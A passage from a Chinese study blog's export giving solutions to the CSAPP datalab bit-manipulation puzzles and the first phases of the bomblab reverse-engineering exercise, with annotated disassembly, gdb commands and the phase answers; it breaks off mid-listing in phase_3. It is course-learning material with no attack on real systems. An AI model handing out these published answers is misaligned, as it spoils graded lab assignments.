class="line">  <span class="type">int</span> d = !((y + (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>);<span class="comment">//取非保证：y &gt;= x 为1 y&lt;x 为0</span></span><br><span class="line">  <span class="keyword">return</span> (c&amp;d) | (!c&amp;a);<span class="comment">//左边条件：符号相等 则返回相减的符号位，右边条件： 符号不相等 若a&lt;0 返回1 &gt;0返回0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-9-logicalNeg"><a href="#2-9-logicalNeg" class="headerlink" title="2.9 logicalNeg"></a>2.9 logicalNeg</h3><ul>
<li><p>用位运算 实现逻辑非 !</p>
</li>
<li><p>0[0000]  和Tmin[1000] 两个补码特殊</p>
</li>
<li><p>0 的符号位 与其补码符号位 <strong>位或</strong> 为0。 Tmin位或为1  [1000]  [1000]—-利用这一点</p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x | (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>) + <span class="number">1</span>;<span class="comment">//左移31后  对于非0数 产生-1[1111] 0产生[0000] 所以+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-10-howManyBits"><a href="#2-10-howManyBits" class="headerlink" title="2.10 howManyBits"></a>2.10 howManyBits</h3><ul>
<li><p>返回最小能表示数字X的补码位数</p>
</li>
<li><p>如果是一个正数，则需要找到它最高的一位（假设是n）是1 的 则在加上符号位， 结果为n+1</p>
</li>
<li><p>如果是负数，则需要知道其最高一位是0的 （例如 -3[1101] 和 -3[101] 表示的是一个值，所以最小需要三位来表示）</p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> b16, b8, b4, b2, b1, b0;</span><br><span class="line">  <span class="type">int</span> sign = x &gt;&gt; <span class="number">31</span>;<span class="comment">// 取 符号位 如果是负数 则sign为0xFFFFFFFF，否则为0x00000000</span></span><br><span class="line">  <span class="comment">//如果x为正则不变，为负数按位取反（这样好找最高位为1的，原来是最高位为0的，也将符号位去掉了）  </span></span><br><span class="line">  x = (sign &amp; ~x) | (~sign &amp; x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 二分法 不断缩小范围</span></span><br><span class="line">  b16 = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;<span class="comment">//高16位是否存在1</span></span><br><span class="line">  x = x &gt;&gt; b16;</span><br><span class="line">  b8 = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>;<span class="comment">//剩余的高8位</span></span><br><span class="line">  x = x &gt;&gt; b8;</span><br><span class="line">  b4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  x = x &gt;&gt; b4;</span><br><span class="line">  b2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  x = x &gt;&gt; b2;</span><br><span class="line">  b1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  x = x &gt;&gt; b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16 + b8 + b4 + b2 + b1 + b0 + <span class="number">1</span>; <span class="comment">//+1 是符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>b16 = !!(x &gt;&gt; 16) &lt;&lt; 4;</code>x &gt;&gt; 16 将x 右移16位 丢掉低16位 保留高16位</p>
<ul>
<li><code>！！</code> 常见的技巧，用于将一个数 转换为逻辑值  用来检查移动后的整数是否为0 ，即检查原来高165为是否存在1 。</li>
<li><code>&lt;&lt; 4 </code>如果移动后不为0 那么<code>！！的结果为1</code>，左移4位即 <code>1 &lt;&lt; 4</code> 将其转为相应计数为 <code>16 [1000]</code></li>
</ul>
</li>
<li><p>模拟一下12[00000000,00000000,00000000,00001100]</p>
<ul>
<li>sign &#x3D; 0x00000000  然后x &#x3D; 12[00000000,00000000,00000000,00001100]</li>
<li>b16 &#x3D; 0 ， x &#x3D; [00000000,00000000,00000000,00001100]</li>
<li>b8 &#x3D; 0 ， x &#x3D; [00000000,00000000,00000000,00001100]</li>
<li>b4 &#x3D; 0， x&#x3D; [00000000,00000000,00000000,00001100]</li>
<li>b2 &#x3D;2[10]  , x &#x3D;  [00000000,00000000,00000000,00000011]</li>
<li>b1 &#x3D; 1[1] , x &#x3D;  [00000000,00000000,00000000,00000001]</li>
<li>b0 &#x3D; 1 ,</li>
<li>return 2+1+1+1 &#x3D; 5</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-11-floatScale2"><a href="#2-11-floatScale2" class="headerlink" title="2.11 floatScale2"></a>2.11 floatScale2</h3><ul>
<li><p>求2乘以一个浮点数    若uf为NaN 或无穷大 则直接返回   否则计算uf * 2返回。</p>
</li>
<li><p>特殊情况： 无穷小 、 0 、 无穷大和非数值NaN  此时这些浮点数的指数部分分别存储为 0、 0、 255 、255，因此无穷大和NaN则直接返回就行，无穷小和0只需要在原数乘二然后再加上符号位就可以（因为不会越界）</p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> sign = uf &amp; (<span class="number">1</span> &lt;&lt; <span class="number">31</span>);<span class="comment">//符号位</span></span><br><span class="line">  <span class="type">int</span> exp = (uf &amp; <span class="number">0x7f800000</span>) &gt;&gt; <span class="number">23</span>; <span class="comment">//0x7f800000 浮点数最大值  与uf做于 截取出 exp的数据</span></span><br><span class="line">  <span class="comment">//特殊情况</span></span><br><span class="line">  <span class="keyword">if</span> (exp == <span class="number">0</span>) <span class="keyword">return</span> uf &lt;&lt; <span class="number">1</span> | sign;<span class="comment">//指数为0  直接返回乘以2 的值 左移一个即乘以2</span></span><br><span class="line">  <span class="keyword">if</span> (exp == <span class="number">255</span>) <span class="keyword">return</span> uf;<span class="comment">//无穷大或NaN 直接返回</span></span><br><span class="line">  exp++;<span class="comment">//指数加一，相当于乘二 相当于左移一位</span></span><br><span class="line">  <span class="keyword">if</span> (exp == <span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span> | sign; <span class="comment">//指数加一后为255 </span></span><br><span class="line">  <span class="keyword">return</span> (exp &lt;&lt; <span class="number">23</span>) | (uf &amp; <span class="number">0x807fffff</span>); <span class="comment">//否则 返回指数+1后和 原来数其他位的结果 也就是乘以2的结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-12-floatFloat2Int"><a href="#2-12-floatFloat2Int" class="headerlink" title="2.12 floatFloat2Int"></a>2.12 floatFloat2Int</h3><ul>
<li><p>实现 (int)uf  将浮点数转为整数</p>
</li>
<li><p>溢出 返回0x80000000u   </p>
</li>
<li><p>偏置值127 在单精度浮点数中 偏置值为2^(k-1)-1，其中单精度指数部分占了 8为 所以 2^（8-1）-1&#x3D;127</p>
</li>
<li><p>在单精度浮点表示中，<strong>尾数（即有效数字）部分的位数是 23 位</strong>。当对浮点数进行整数转换时，需要考虑到指数部分的影响。如果指数部分大于 23，意味着尾数部分需要左移，以便将小数部分转换为整数。</p>
<p>这是因为指数的值实际上代表了小数点向左或向右移动的位数。<strong>如果指数大于 23，表示小数点要向左移动超过尾数部分的位数，</strong>因此需要将尾数左移，以保留整数部分。左移的位数是指数值减去 23，因为每左移一位，相当于乘以 2 的一次方。</p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> sign = uf &gt;&gt; <span class="number">31</span>;<span class="comment">//符号位</span></span><br><span class="line">  <span class="type">int</span> exp = ((uf &amp; <span class="number">0x7f800000</span>) &gt;&gt; <span class="number">23</span>) <span class="number">-127</span>;<span class="comment">//-127 偏置值</span></span><br><span class="line">  <span class="type">int</span> frac = (uf &amp; <span class="number">0x007fffff</span>) | <span class="number">0x00800000</span>; <span class="comment">//尾数 并且补上隐藏的1 得到完整的整数</span></span><br><span class="line">  <span class="keyword">if</span> (!(uf &amp; <span class="number">0x7fffffff</span>)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//如果uf=0 则return 0</span></span><br><span class="line">  <span class="keyword">if</span> (exp &gt; <span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>; <span class="comment">//如果指数大于31 则返回溢出值 因为整数int为32位</span></span><br><span class="line">  <span class="keyword">if</span> (exp &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//指数小于0 小数部分无法表示 返回0</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (exp &gt; <span class="number">23</span>) frac &lt;&lt;= (exp - <span class="number">23</span>);<span class="comment">//exp大于23   需要将小数位左移</span></span><br><span class="line">  <span class="keyword">else</span> frac &gt;&gt;= (<span class="number">23</span> - exp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!((frac &gt;&gt; <span class="number">31</span>) ^ sign)) <span class="keyword">return</span> frac; <span class="comment">//符号相同则返回原值</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (frac &gt;&gt; <span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>;<span class="comment">//如果为负（即原来为正），返回溢出值</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> ~frac + <span class="number">1</span>;<span class="comment">//如果为正（原来为负），返回相反数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-13-floatPower2"><a href="#2-13-floatPower2" class="headerlink" title="2.13 floatPower2"></a>2.13 floatPower2</h3><ul>
<li><p>求2.0^x</p>
</li>
<li><p>exp &lt;&#x3D; 0 指数部分太小 而无法用单精度浮点数表示 </p>
</li>
<li></li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> exp = x + <span class="number">127</span>; <span class="comment">//把x当作真指数</span></span><br><span class="line">  <span class="keyword">if</span> (exp &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 0 &lt; 原数&lt;1 返回0</span></span><br><span class="line">  <span class="keyword">if</span> (exp &gt;= <span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>;<span class="comment">//溢出</span></span><br><span class="line">  <span class="keyword">return</span> exp &lt;&lt;<span class="number">23</span>; <span class="comment">//否则x作为正常的数 有效范围 则exp 左移23位  将指数部分放在合适的位数上</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​</p>
</li>
</ul>
<p>	</p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>datalab</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-3-bomblab</title>
    <url>/2023/10/25/CSAPP-3-bomblab/</url>
    <content><![CDATA[<h1 id="3-bomb-lab"><a href="#3-bomb-lab" class="headerlink" title="3.bomb lab"></a>3.bomb lab</h1><p><strong>参考：</strong></p>
<ol>
<li><a href="https://blog.csdn.net/aufefgavo/article/details/119697258">深入理解计算机系统-bomblab详解_独小雪的博客-CSDN博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/449879729">Lab2 CSAPP: BombLab环境+思路+全注释 - 知乎 (zhihu.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/451623574">手把手教你拆解 CSAPP 的 炸弹实验室 BombLab - 知乎 (zhihu.com)</a></li>
</ol>
<h2 id="3-1基本指令"><a href="#3-1基本指令" class="headerlink" title="3.1基本指令"></a>3.1基本指令</h2><ul>
<li>必须反汇编对炸弹进行拆除</li>
<li><code>objdump -d bomb &gt; bomb.s</code>生成bomb的汇编文件</li>
<li><code>objdump -d bomb &gt; bomb.t</code>生成bomb的符号表</li>
<li><code>gdb bomb</code>gdb调试bomb程序</li>
<li><code>(gdb) b 0x0000</code>设置断点</li>
<li><code>(gdb) x/wx 0x0000 </code>指令x：查看内存指令、w：四字节  x：16进制显示</li>
<li><strong>所有的字符串都是通过%rdi寄存器传入的</strong>，在 bomb.s中搜索 phase_1，可以得到如下的代码：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">400e32:	e8 67 06 00 00       	callq  40149e &lt;read_line&gt; # 读取命令行的字符串，%rax是 readline 的返回值也就是输入的string</span><br><span class="line">400e37:	48 89 c7             	mov    %rax,%rdi #将输入的string存入 %rdi 寄存器，传入phase函数</span><br><span class="line">400e3a:	e8 a1 00 00 00       	callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">400e3f:	e8 80 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">400e44:	bf a8 23 40 00       	mov    $0x4023a8,%edi</span><br></pre></td></tr></table></figure>









<h2 id="3-2-phase1"><a href="#3-2-phase1" class="headerlink" title="3.2 phase1"></a>3.2 phase1</h2><p>在<strong>bomb.s</strong>搜素 phase_1 ，可以得到如下的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp </span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p><strong>题目分析：</strong></p>
<ul>
<li>函数调用了<code>strings_not_equal</code>这个函数，主要是判断输入的字符串与对比的字符串是否不相等：相等返回0，不相等则会返回非0。<strong>即 如果%rdi 与 地址（0x402400）存的字符串相等就不会bomb</strong></li>
</ul>
<p><strong>汇编代码分析：</strong></p>
<ul>
<li><code>sub    $0x8,%rsp </code>  %rsp是栈指针寄存器，存储栈的顶部位置， 这一行将栈顶减去8位，为函数的局部变量分配空间。</li>
<li><code>mov    $0x402400,%esi</code>将 地址（0x402400）的字符串，放入到 %esi 中。</li>
<li><code>callq  401338 &lt;strings_not_equal&gt;</code>  调用地址（401338）的函数 用于判断两个字符串是否不相等</li>
<li><code>test   %eax,%eax</code>  对%eax寄存器中的内容 进行与运算。<strong>test</strong>指令执行按位与的操作，类似于<strong>and</strong>指令，但是<strong>test 不会保存结果，只会更新标志寄存器的值</strong>。<ul>
<li>因此test指令通常用作检查某个寄存器或者内存位置的位模式，而不需要保存结果。</li>
<li>test操作，如果结果为0，则将零标志位（ZF），设置为1 通常与（je、jne、j1、jg）配合使用</li>
</ul>
</li>
<li><code>je     400ef7 &lt;phase_1+0x17&gt;</code> 与运算设置了0 标志位 ，那么就跳转400ef7 <code>add    $0x8,%rsp</code> 释放之前的空间。<ul>
<li>je指令 对应于标志寄存器中的零标志（ZF），如果上一条指令产生了零标志，那么程序会跳转到指定地址。</li>
</ul>
</li>
<li><code>callq  40143a &lt;explode_bomb&gt;</code> 否则执行地址（40143a）的函数 爆炸</li>
</ul>
<p><strong>题解：</strong></p>
<ul>
<li><code>gdb bomb</code></li>
<li><code>x/s 0x402400</code><ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231025214536447.png" alt="image-20231025214536447"></li>
</ul>
</li>
<li>在中断中输入：Border relations with Canada have never been better.<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231025214702401.png" alt="image-20231025214702401"></li>
</ul>
</li>
</ul>
<h2 id="3-2-phase-2"><a href="#3-2-phase-2" class="headerlink" title="3.2 phase_2"></a>3.2 phase_2</h2><p><strong>phase_2汇编代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp #开了10个4字节的空间，多开了4个？？？</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi#将开辟的地址传入%rsp存放的就是数组第一个元素</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt; #读取六个数字</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp) #第一个参数是否是1</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt; #是1则跳转0x400f30</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt; #否则就bomb</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax #取得上一个输入的数，放入%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax #%加倍</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx) #与当前的数比较</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt; #相等则跳过下一行到0x400f25</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx #指向下一个参数的位置 %rbx加上立即数</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx #判断是否是第六个参数 0x18 == 24 == 4*6</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt; #不是则继续进行循环</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt; # 是则跳转0x400f3c</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx #第二个数</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;#跳转0x400f17继续循环</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p><strong>read_six_numbers汇编代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:#从我们输入的字符串中读取6个数字   第一个参数是%rdi</span><br><span class="line">  40145c:	48 83 ec 18          	sub    $0x18,%rsp #0x18 = 4 * 6 6个4字节的地址</span><br><span class="line">  401460:	48 89 f2             	mov    %rsi,%rdx #%rdx第三个参数寄存器</span><br><span class="line">  401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx #%rcx第四个</span><br><span class="line">  401467:	48 8d 46 14          	lea    0x14(%rsi),%rax </span><br><span class="line">  40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp) #第八个</span><br><span class="line">  401470:	48 8d 46 10          	lea    0x10(%rsi),%rax</span><br><span class="line">  401474:	48 89 04 24          	mov    %rax,(%rsp)</span><br><span class="line">  401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9# 第六个</span><br><span class="line">  40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8 #第五个</span><br><span class="line">  401480:	be c3 25 40 00       	mov    $0x4025c3,%esi</span><br><span class="line">  401485:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40148a:	e8 61 f7 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt; #sscanf</span><br><span class="line">  40148f:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">  401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">  401494:	e8 a1 ff ff ff       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401499:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  40149d:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p><strong>思路：</strong></p>
<ul>
<li><code>callq  40145c &lt;read_six_numbers&gt;</code>调用函数“先读入六个数”，同 phase1一样，%rdi原封不动的传入了这个函数，那么%rsi存入的是什么呢？</li>
<li><code>sub    $0x28,%rsp</code>和<code>mov    %rsp,%rsi</code> 这两行代码可以看出，先将%rsp中的栈指针栈顶 减去 0x28，然后存入%rsi中，<strong>所以%rsi中存入的是地址</strong>。结合函数<read_six_numbers> 可以得%rsi 在源码是一个指针，指向一个数组的开头</read_six_numbers></li>
<li>在read six numbers中 0x4（%rsi） 。。有几个地址还因为寄存器放不下 放入到了栈中，sscanf的第一个参数是read six numbers的第一个参数，输入的字符串 第二个参数是存储在0x4025c3中的字符串格式<ul>
<li><code>x/s 0x4025c3</code>查看 字符串存储的格式</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026153037844.png" alt="image-20231026153037844"></li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026151232389.png" alt="image-20231026151232389"></li>
</ul>
</li>
<li>回到phase_2函数<ul>
<li>判断第一个元素是否是1，是则跳转0x400f30</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026151727168.png" alt="image-20231026151727168"></li>
<li>0x400f30 是%rsp增加四字节（数组的第二个元素），放入%rbx中，然后把最后一个数字的下一个字节放入到%rbp——–0x18 &#x3D; 24 &#x3D; 4 * 6  用于判断循环终止，然后回到0x400f17</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026151852711.png" alt="image-20231026151852711"></li>
<li>0x400f17  <code>mov    -0x4(%rbx),%eax</code> <strong>取得%rbx上一个数 放入%eax ，然后相加使其翻倍</strong>，最后将翻倍的数与当前的数进行比较 ，循环比较剩下五个数。</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026152238146.png" alt="image-20231026152238146"></li>
<li>其实是以1为首项，2为公比的等比数列。</li>
</ul>
</li>
<li>所以答案输入1 2 4 8 16 32就好</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026153417850.png" alt="phrase_2"></li>
</ul>
<h2 id="3-3-phase-3"><a href="#3-3-phase-3" class="headerlink" title="3.3 phase_3"></a>3.3 phase_3</h2><p><strong>phase_3 coding</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi #“%d %d”</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax #和1比较</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt; #greater大于则跳转 0x400f6a</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt; #否则bomb</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp) #比较第一个数是否小于7 </span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt; #above无符号大于则跳转 bomb不满足 case</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax </span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8) #无条件跳转 0x400f7c case0</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax #case 0  0xcf = 207</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt; </span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax #case 1 0x2c3 = 707</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt; </span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax #case 2 0x100 = 256</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt; </span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax #case 3 0x185 = 389</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt; </span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax #case 4 0xce = 206</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt; </span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax #case 5 0x2aa = 682</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt; </span><br><span class="line">  400fa6:	b8 